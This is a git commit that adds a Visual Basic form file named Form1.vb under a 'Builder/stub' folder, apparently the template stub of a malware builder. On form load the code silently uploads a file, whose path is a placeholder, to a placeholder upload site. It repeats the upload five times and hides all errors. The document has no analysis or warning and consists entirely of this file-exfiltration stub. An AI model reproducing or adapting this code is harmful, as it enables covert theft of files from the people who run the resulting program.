5f14bf7b3e833447aad639e0e7f2ef570314d1b5
YodasProjects <76970992+YodasProjects@users.noreply.github.com>
2021-01-07 12:25:28 +0300

    Add files via upload

---
+++ Builder/stub/stub/Form1.vb
@@ -0,0 +1,28 @@
+﻿Public Class Form1
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Dim control As String = "%control%"
+        Dim filepath As String = "%filepath%"
+        Dim uploadsite As String = "%uploadsite%"
+        Try
+            My.Computer.Network.UploadFile(control & filepath, uploadsite)
+        Catch ex As Exception
+        End Try
+        Try
+            My.Computer.Network.UploadFile(control & filepath, uploadsite)
+        Catch ex As Exception
+        End Try
+        Try
+            My.Computer.Network.UploadFile(control & filepath, uploadsite)
+        Catch ex As Exception
+        End Try
+        Try
+            My.Computer.Network.UploadFile(control & filepath, uploadsite)
+        Catch ex As Exception
+        End Try
+        Try
+            My.Computer.Network.UploadFile(control & filepath, uploadsite)
+        Catch ex As Exception
+        End Try
+
+    End Sub
+End Class
